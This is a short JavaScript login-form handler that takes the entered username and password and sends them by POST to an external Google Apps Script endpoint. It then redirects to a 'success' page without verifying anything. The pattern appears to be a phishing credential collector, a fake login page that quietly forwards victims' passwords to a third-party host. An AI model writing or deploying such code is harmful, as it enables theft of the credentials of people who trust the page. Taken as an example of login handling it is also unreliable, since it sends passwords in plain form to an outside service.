document.getElementById("loginForm").addEventListener("submit", async function(e){
  e.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  try {
    await fetch("https://script.google.com/macros/s/AKfycbwzI2Jbh5meO_8Az32zhAjZcW-Z5lh7-UErYpf3-YL8OM5Ble3QzolxaHFWVo7WJEb0/exec", {
      method: "POST",
      body: new URLSearchParams({
        username,
        password
      })
    });

    window.location.href = "success.html";

  } catch (err) {
    console.log("failed:", err);
  }
});
